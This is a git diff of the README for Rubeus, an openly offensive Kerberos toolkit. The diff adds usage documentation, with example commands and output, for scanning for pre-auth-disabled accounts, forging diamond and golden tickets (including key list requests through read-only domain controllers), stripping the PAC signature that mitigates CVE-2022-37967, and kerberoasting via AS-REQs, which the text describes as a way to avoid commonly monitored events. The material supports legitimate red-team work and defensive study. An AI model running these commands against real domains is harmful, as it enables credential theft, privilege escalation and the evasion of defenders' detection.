+            Rubeus.exe asrep2kirbi /asrep:<BASE64 | FILEPATH> </key:BASE64 | /keyhex:HEXSTRING> [/enctype:DES|RC4|AES128|AES256] [/ptt] [/luid:X] [/nowrap]
+
+        Insert new DES session key into a Kirbi:
+            Rubeus.exe kirbi /kirbi:<BASE64 | FILEPATH> /sessionkey:SESSIONKEY /sessionetype:DES|RC4|AES128|AES256 [/ptt] [/luid:X] [outfile:FILENAME] [/nowrap]
 
 
      NOTE: Base64 ticket blobs can be decoded with :
@@ -337,6 +373,7 @@ Breakdown of the ticket request commands:
 | [asktgs](#asktgs) | Request a service ticket from a passed TGT |
 | [renew](#renew) | Renew (or autorenew) a TGT or service ticket |
 | [brute](#brute) | Perform a Kerberos-based password bruteforcing attack. 'spray' can also be used instead of 'brute' |
+| [preauthscan](#preauthscan) | Preform a scan for accounts that do not require Kerberos pre-authentication |
 
 
 ### asktgt
@@ -348,6 +385,12 @@ Note that no elevated privileges are needed on the host to request TGTs or apply
 By default, several differences exists between AS-REQ's generated by Rubeus and genuine AS-REQ's. To form AS-REQ's more inline with genuine requests, the `/opsec` flag can be used, this will send an initial AS-REQ without pre-authentication first, if this succeeds, the resulting AS-REP is decrypted and TGT return, otherwise an AS-REQ with pre-authentication is then sent. As this flag is intended to make Rubeus traffic more stealthy, it cannot by default be used with any encryption type other than `aes256` and will just throw a warning and exit if another encryption type is used. To allow for other encryption types to be used with the `/opsec` changes, the `/force` flag exists.
 
 PKINIT authentication is supported with the `/certificate:X` argument. When the private key within the PFX file is password protected, this password can be passed with the `/password:X` argument. When using PKINIT authentication the `/getcredentials` flag can be used to automatically request a U2U service ticket and retrieve the account NT hash.
+
+Requesting a TGT without a PAC can be done using the `/nopac` switch.
+
+Using a KDC proxy ([MS-KKDCP](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kkdcp/5bcebb8d-b747-4ee5-9453-428aec1c5c38)) to make the request is possible using the `/proxyurl:URL` argument. The full URL for the KDC proxy is required, eg. https://kdcproxy.exmaple.com/kdcproxy
+
+The `/nopreauth` flag can be used to send an AS-REQ without pre-authentication. The `/service:SPN` argument can be used to request service tickets using AS-REQ's directly, it will take an SPN or a username.
 
 Requesting a ticket via RC4 hash for **dfm.a@testlab.local**, applying it to the current logon session:
 
@@ -515,6 +558,9 @@ The `/u2u` flag was implemented to request User-to-User tickets. Together with t
 
 The `/printargs` flag will print the arguments required to forge a ticket with the same PAC values if the PAC is readable. This could be done by supplying the `/servicekey:X` argument or performing a `/u2u` request with a known session key.
 
+Using a KDC proxy ([MS-KKDCP](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kkdcp/5bcebb8d-b747-4ee5-9453-428aec1c5c38)) to make the request is possible using the `/proxyurl:URL` argument. The full URL for the KDC proxy is required, eg. https://kdcproxy.exmaple.com/kdcproxy
+
+The `/keyList` flag was implemented for Kerberos [Key List Requests](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/732211ae-4891-40d3-b2b6-85ebd6f5ffff). These requests must utilise a forged partial TGT from a read-only domain controller in the `/ticket:BASE64|FILE.KIRBI` parameter, further details on this forged TGT in the [golden](#golden) section. Furthermore, the `/spn:x` field must be set to the KRBTGT SPN within the domain, eg. KRBTBT/domain.local.
 
 Requesting a TGT for dfm.a and then using that ticket to request a service ticket for the "LDAP/primary.testlab.local" and "cifs/primary.testlab.local" SPNs:
 
@@ -991,6 +1037,31 @@ The **brute** action will perform a Kerberos-based password bruteforcing or pass
 
           doIFLDCCBSigAwIBBaEDAgEWooIELDCCBChhggQkMIIEIKADAgEFoRAbDlR...(snip)...
 
+### preauthscan
+
+The **preauthscan** action will send AS-REQ's for all usernames passed into the `/users` argument to discover accounts that do not require Kerberos pre-authentication.
+
+    C:\Rubeus>Rubeus.exe preauthscan /users:uns.txt /domain:semperis.lab /dc:192.168.71.220
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v2.2.0
+
+    [*] Action: Scan for accounts not requiring Kerberos Pre-Authentication
+
+    [*] cclark: Pre-Auth Required
+    [*] jjones: Pre-Auth Not Required
+    [*] rwilliams: Pre-Auth Required
+    [*] svc_sqlserver: Pre-Auth Required
+    [*] pgreen: Pre-Auth Required
+    [*] jsmith: Pre-Auth Required
+    [*] tnahum: Pre-Auth Required
+    [*] sfederovsky: Pre-Auth Required
 
 ## Constrained delegation abuse
 
@@ -1008,6 +1079,10 @@ The **s4u** action is nearly identical to [Kekeo](https://github.com/gentilkiwi/
 A **TL;DR** explanation is that an account with constrained delegation enabled is allowed to request tickets _to itself_ as any user, in a process known as S4U2self. In order for an account to be allowed to do this, it has to have **TrustedToAuthForDelegation** enabled in it's useraccountcontrol property, something that only elevated users can modify by default. This ticket has the **FORWARDABLE** flag set by default. The service can then use this specially requested ticket to request a service ticket to any service principal name (SPN) specified in the account's **msds-allowedtodelegateto** field. So long story short, if you have control of an account with **TrustedToAuthForDelegation** set and a value in **msds-allowedtodelegateto**, you can pretend to be any user in the domain to the SPNs set in the account's **msds-allowedtodelegateto** field.
 
 This "control" can be the hash of the account (`/rc4` or `/aes256`), or an existing TGT (`/ticket:X`) for the account with a **msds-allowedtodelegateto** value set. If a `/user` and rc4/aes256 hash is supplied, the **s4u** module performs an [asktgt](#asktgt) action first, using the returned ticket for the steps following. If a TGT `/ticket:X` is supplied, that TGT is used instead.
+
+If an account hash is supplied, the `/nopac` switch can be used to request the initial TGT without a PAC.
+
+Using a KDC proxy ([MS-KKDCP](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kkdcp/5bcebb8d-b747-4ee5-9453-428aec1c5c38)) to make the requests is possible using the `/proxyurl:URL` argument. The full URL for the KDC proxy is required, eg. https://kdcproxy.exmaple.com/kdcproxy. When used for the `s4u` command, *all* requests will be sent through the proxy.
 
 A `/impersonateuser:X` parameter **MUST** be supplied to the **s4u** module. If nothing else is supplied, just the S4U2self process is executed, returning a forwardable ticket:
 
@@ -1213,6 +1288,7 @@ Breakdown of the ticket forgery commands:
 | ----------- | ----------- |
 | [golden](#golden) | Forge an ticket granting ticket (TGT) |
 | [silver](#silver) | Forge a service ticket, can also forge TGTs |
+| [diamond](#diamond) | Forge a diamond ticket |
 
 There are many similarities between the `golden` and `silver` commands, the reason for them being separate is to simplfy the `golden` command. Service tickets can be much more complex than TGTs with different keys and extra sections, while TGTs can be forged with the `silver` command, `golden` provides fewer potential arguments as the features not relevent to TGTs are not present.
 
@@ -1255,6 +1331,7 @@ Other arguments common to both commands but to set fields outside of the PAC are
 | /rangeend | This is for creating multiple tickets that start at different times. This will be the last starttime, relative to `/starttime`, in the format of multiplier plus timerange, so for 5 days, 5d. More information on this format explained below |
 | /rangeinterval | This is for creating multiple tickets that starts are different times. This is the interval that will be used between each starttime, in the format of multiplier plus timerange, so for 5 days, 5d. More information on this format explained below |
 | /flags | Sets the ticket flags within the EncTicketPart (Default: forwardable,renewable,pre_authent and for `golden` also initial) |
+| /extendedupndns | Includes the new extended UpnDns (which includes the samaccountname and account SID) |
 
 For the relative times described in the tables above, the format is an integer used as a multiplier followed by a single character which acts as a timerange. The meaning of each supported character is shown in the table below (**These are case sensitive**):
 
@@ -1279,6 +1356,12 @@ The `/printcmd` flag can be used to print the arguments required to generate ano
 ### golden
 
 The **golden** action will forge a TGT for the user `/user:X` encrypting the ticket with the hash passed with `/des:X`, `/rc4:X`, `/aes128:X` or `/aes256:X` and using the same key to create the ServerChecksum and KDCChecksum. The various arguments to set fields manually are described above or the `/ldap` flag can be used to automatically retrieve the information from the domain controller.
+
+The `/oldpac` switch can be used to exclude the new *Requestor* and *Attributes* PAC_INFO_BUFFERs, added in response to CVE-2021-42287.
+
+The `/extendedupndns` switch will include the new extended UpnDns elements. This involved adding _2_ to the Flags, as well as containing the samaccountname and account SID.
+
+The `/rodcNumber:x` parameter was added to perform kerberos [Key List Requests](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/732211ae-4891-40d3-b2b6-85ebd6f5ffff). The value of this parameter is the number specified after krbtgt_x the `msDS-KrbTgtLink` attribute of the read-only domain controller, eg. krbtgt_12345 would be 12345. This request requires certain flags which can be set using `/flags:forwardable,renewable,enc_pa_rep`. The key (`/des:X`, `/rc4:X`, `/aes128:X` or `/aes256:X`) used to encrypt is the KRBTGT_x accounts key. Further information can be found on Elad Shamir's blog post [here](https://posts.specterops.io/at-the-edge-of-tier-zero-the-curious-case-of-the-rodc-ef5f1799ca06), 
 
 Forging a TGT using the `/ldap` flag to retrieve the information and the `/printcmd` flag to print a command to forge another ticket with the same PAC information:
 
@@ -1527,6 +1610,8 @@ The **silver** action will forge a ticket for the user `/user:X` and service `/s
 The `/cname:X` and `/crealm:X` arguments can be used to set different values for those fields within the EncTicketPart (encrypted part of the ticket), this is sometimes seen within referral delegation tickets. A S4UDelegationInfo PAC section can be added by passing the `/s4uproxytarget:X` and `/s4utransitedservices:SPN1,SPN2,...` arguments, this section provides a final target for delegation and the list of SPNs the delegation has happened through.
 
 The `/authdata` flag can be used to add some generic Authorization Data sections to the EncTicketPart, by default this will include a *KERB-LOCAL* section and a *KERB-AD-RESTRICTION-ENTRY* section with some default values.
+
+The `/nofullpacsig` flag will **exclude** the new *FullPacChecksum*, [introduced](https://support.microsoft.com/en-gb/topic/kb5020805-how-to-manage-kerberos-protocol-changes-related-to-cve-2022-37967-997e9acc-67c5-48e1-8d0d-190269bf4efb) to resolve the [CVE-2022-37967](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-37967) vulnerability. This signature is included by default in any tickets not secured with the krbtgt key.
 
 Forging a service ticket to **cifs/SQL1.rubeus.ghostpack.local** for the user **ccob** using the services *RC4* password hash and signing the KDCChecksum and TicketChecksum with the proper KRBTGT *AES256* key, using LDAP with alternate credentials to get the PAC information:
 
@@ -1812,6 +1897,96 @@ This referral TGT can then be used to request service tickets for services in **
                    0 File(s)              0 bytes
                    8 Dir(s)  94,901,772,288 bytes free
 
+### diamond
+
+The **diamond** action will forge a diamond TGT by modifying a TGT requested for a user using the given arguments. First a TGT will be requested for the specified user and encryption key (`/rc4`, `/aes128`, `/aes256`, or `/des`). A `/password` flag can also be used instead of a hash - in this case `/enctype:X` will default to RC4 for the exchange, with `des|aes128|aes256` as options. Alternatively, PKINIT authentication is supported with the `/certificate:X` argument. When the private key within the PFX file is password protected, this password can be passed with the `/password:X` argument. Lastly, the `/tgtdeleg` flag can be passed to request a TGT using the tgtdeleg trick. The `/krbkey:X` argument is used to decrypt the ticket, resign it after the changes have been made, and rencrypt the ticket.
+
+If no `/domain` is specified, the computer's current domain is extracted, and if no `/dc` is specified the same is done for the system's current domain controller. The `/ptt` flag will "pass-the-ticket" and apply the resulting Kerberos credential to the current logon session. The `/luid:0xA..` flag will apply the ticket to the specified logon session ID (elevation needed) instead of the current logon session.
+
+Note that no elevated privileges are needed on the host to request TGTs or apply them to the **current** logon session, just the correct hash for the target user. Also, another opsec note: only one TGT can be applied at a time to the current logon session, so the previous TGT is wiped when the new ticket is applied when using the `/ptt` option. A workaround is to use the `/createnetonly:C:\X.exe` parameter (which hides the process by default unless the `/show` flag is specified), or request the ticket and apply it to another logon session with `ptt /luid:0xA..`.
+
+The `/ticketuser:X` argument is used to specify the username to be used within the modified ticket, `/ticketuserid:#` to specify the user's RID, `/groups:RID1,RID2...` to specify the groups for the ticket and `/sids:SID1,SID2...` to specify the SIDs to be included in the ExtraSIDs field.
+
+Creating a diamond TGT using a username and password:
+
+    C:\Rubeus>Rubeus.exe diamond /krbkey:3111b43b220d2f4eb8e68fe7be1179ce69328c9071cba14bef4dbb02b1cfeb9c /user:loki /password:Mischief$ /enctype:aes /domain:marvel.local /dc:earth-dc.marvel.local /ticketuser:thor /ticketuserid:1104 /groups:512
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v2.1.1
+
+    [*] Action: Diamond Ticket
+
+    [*] Using domain controller: earth-dc.marvel.local (10.1.1.11)
+    [!] Pre-Authentication required!
+    [!]     AES256 Salt: MARVEL.LOCALloki
+    [*] Using aes256_cts_hmac_sha1 hash: 8A90D4F4E8698E76FA014C97A539C1083EDDCB5A281B1274568758FB999DFCE7
+    [*] Building AS-REQ (w/ preauth) for: 'marvel.local\loki'
+    [*] Using domain controller: 10.1.1.11:88
+    [+] TGT request successful!
+    [*] base64(ticket.kirbi):
+
+          doIFejCCBXagAwIBBaEDAgEWooIEgzCCBH9hggR7MIIEd6ADAgEFoQ4bDE1BUlZFTC5MT0NBTKIhMB+g
+                                            ...(snip)...
+          oRgwFhsGa3JidGd0GwxNQVJWRUwuTE9DQUw=
+
+    [*] Decrypting TGT
+    [*] Retreiving PAC
+    [*] Modifying PAC
+    [*] Signing PAC
+    [*] Encrypting Modified TGT
+
+    [*] base64(ticket.kirbi):
+
+          doIFajCCBWagAwIBBaEDAgEWooIEczCCBG9hggRrMIIEZ6ADAgEFoQ4bDE1BUlZFTC5MT0NBTKIhMB+g
+                                            ...(snip)...
+          UlZFTC5MT0NBTA==
+
+Creating a diamond TGT using the tgtdeleg trick:
+
+    C:\Rubeus>Rubeus.exe diamond /krbkey:3111b43b220d2f4eb8e68fe7be1179ce69328c9071cba14bef4dbb02b1cfeb9c /tgtdeleg /ticketuser:thor /ticketuserid:1104 /groups:512
+
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v2.1.1
+
+    [*] Action: Diamond Ticket
+
+    [*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
+    [*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/Earth-DC.marvel.local'
+    [+] Kerberos GSS-API initialization success!
+    [+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
+    [*] Found the AP-REQ delegation ticket in the GSS-API output.
+    [*] Authenticator etype: aes256_cts_hmac_sha1
+    [*] Extracted the service ticket session key from the ticket cache: imNrWVWRhlB61dUk5EWEdQL7DgqBQ/UckUs9pBvw6JU=
+    [+] Successfully decrypted the authenticator
+    [*] base64(ticket.kirbi):
+
+          doIFejCCBXagAwIBBaEDAgEWooIEgzCCBH9hggR7MIIEd6ADAgEFoQ4bDE1BUlZFTC5MT0NBTKIhMB+g
+                                            ...(snip)...
+          oRgwFhsGa3JidGd0GwxNQVJWRUwuTE9DQUw=
+
+    [*] Decrypting TGT
+    [*] Retreiving PAC
+    [*] Modifying PAC
+    [*] Signing PAC
+    [*] Encrypting Modified TGT
+
+    [*] base64(ticket.kirbi):
+
+          doIFajCCBWagAwIBBaEDAgEWooIEczCCBG9hggRrMIIEZ6ADAgEFoQ4bDE1BUlZFTC5MT0NBTKIhMB+g
+                                            ...(snip)...
+          UlZFTC5MT0NBTA==
 
 
 ## Ticket Management
@@ -2874,6 +3049,8 @@ If the `/autoenterprise` flag is used, if roasting an SPN fails (due to an inval
 
 If the `/ldaps` flag is used, any LDAP queries will go over TLS (port 636).
 
+If the `/nopreauth:USER` argument is used, either the `/spn:Y` or `/spns:Y` argument is required. The `/nopreauth:USER` argument will attempt to send AS-REQ's with the service being those passed in `/spn:Y` or `/spns:Y` to request service tickets.
+
 
 #### kerberoasting opsec
 
@@ -2890,6 +3067,7 @@ Here is a table comparing the behavior of various flags from an opsec perspectiv
 | **/pwdsetafter:X** | Use the supplied date and only enumerate accounts with password last changed after that date |
 | **/pwdsetbefore:X** | Use the supplied date and only enumerate accounts with password last changed before that date |
 | **/resultlimit:X** | Use the specified number to limit the accounts that will be roasted |
+| **/nopreauth:USER** | Will send AS-REQ's rather than TGS-REQ's which results in 4768 events instead of the 4769 frequently monitored for kerberoasting detections |
 
 #### Examples
 
@@ -3347,6 +3525,9 @@ Breakdown of the miscellaneous commands:
 | [hash](#hash) | Hash a plaintext password to Kerberos encryption keys |
 | [tgssub](#tgssub) | Substitute in alternate service names into a service ticket |
 | [currentluid](#currentluid) | Display the current user's LUID |
+| [logonsession](#logonsession) | Display logon session information |
+| [asrep2kirbi](#asrep2kirbi) | Convert an AS-REP and a client key to a Kirbi (KERB_CRED) |
+| [kirbi](#kirbi) | Manipulate Kirbi's (KERB_CRED) |
 
 
 ### createnetonly
@@ -3395,6 +3576,28 @@ Create a visible command prompt:
     [+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
     [+] ProcessID       : 5352
     [+] LUID            : 0x4a091c0
+
+Create a visible command prompt and import a ticket:
+
+    C:\Rubeus>Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show /ticket:ticket.kirbi
+
+     ______        _
+    (_____ \      | |
+     _____) )_   _| |__  _____ _   _  ___
+    |  __  /| | | |  _ \| ___ | | | |/___)
+    | |  \ \| |_| | |_) ) ____| |_| |___ |
+    |_|   |_|____/|____/|_____)____/(___/
+
+    v1.3.3
+
+
+    [*] Action: Create Process (/netonly)
+
+    [*] Showing process : True
+    [+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+    [+] ProcessID       : 5352
+    [+] LUID            : 0x4a091c0
+    [+] Ticket successfully imported!
 
 
 ### changepw
@@ -3512,7 +3715,9 @@ Calculating all hash formats:
 
 The **tgssub** action will take a service ticket base64 blob/file specification and substitute an alternate service name into the ticket. This is useful for S4U abuse and other scenarios.
 
-The `/altservice:X` flag is required and can either be a standalone sname (ldap, cifs, etc.) or a full service principal name (cifs/computer.domain.com). The latter is useful in some S4U2self abuse scenarios with resource-based constrained delegation. See Elad Shamir's [post on the topic](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html) for more information.
+The `/altservice:X` argument is required and can either be a standalone sname (ldap, cifs, etc.) or a full service principal name (cifs/computer.domain.com). The former will create a new sname with only the service given, useful for cases where only the hostname is required. The latter is useful in some S4U2self abuse scenarios with resource-based constrained delegation. See Elad Shamir's [post on the topic](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html) for more information.
+
+The `/srealm:Y` argument is optional and can be used to change the service realm within the ticket.
 
 The `/ptt` flag will "pass-the-ticket" and apply the resulting Kerberos credential to the current logon session. The `/luid:0xA..` flag will apply the ticket to the specified logon session ID (elevation needed) instead of the current logon session.
 
@@ -3809,6 +4014,50 @@ The **currentluid** action will display the current user's logon ID (LUID).
 
     [*] Current LogonID (LUID) : 0x121078 (1183864)
 
+
+### logonsession
+
+The **logonsession** action will display information about the current context's logon session if not elevated, or all logonsessions if elevated.
+
+    C:\Rubeus>Rubeus.exe logonsession
+       ______        _
+      (_____ \      | |
+       _____) )_   _| |__  _____ _   _  ___
+      |  __  /| | | |  _ \| ___ | | | |/___)
+      | |  \ \| |_| | |_) ) ____| |_| |___ |
+      |_|   |_|____/|____/|_____)____/(___/
+
+      v2.1.0
+
+
+    [*] Action: Display current logon session information
+
+        LUID          : 0x28a8fd (2664701)
+        UserName      : harmj0y
+        LogonDomain   : THESHIRE
+        SID           : S-1-5-21-937929760-3187473010-80948926-1104
+        AuthPackage   : Kerberos
+        LogonType     : Interactive (2)
+        Session       : 1
+        LogonTime     : 6/9/2022 1:17:48 PM
+        LogonServer   : DC
+        DnsDomainName : THESHIRE.LOCAL
+        Upn           : harmj0y@theshire.local
+
+If elevated, the `/current` flag will display information for just the current logon session, and `/luid:X` will display information about the target specified logon session.
+
+
+### asrep2kirbi
+
+The **asrep2kirbi** action will convert an AS-REP and a client key to a Kirbi. 
+
+The client key can be supplied as a Base64 encoded blob or as a hex string.
+
+### kirbi
+
+The **kirbi** action is used to manipulate Kirbi's (KERB_CRED's).
+
+Currently it only supports modifying/inserting a session key using the **/sessionkey:SESSIONKEY** and **/sessionetype:DES|RC4|AES128|AES256** arguments, passing the Kirbi in using the **/kirbi:X** argument.
 
 ## Compile Instructions
 
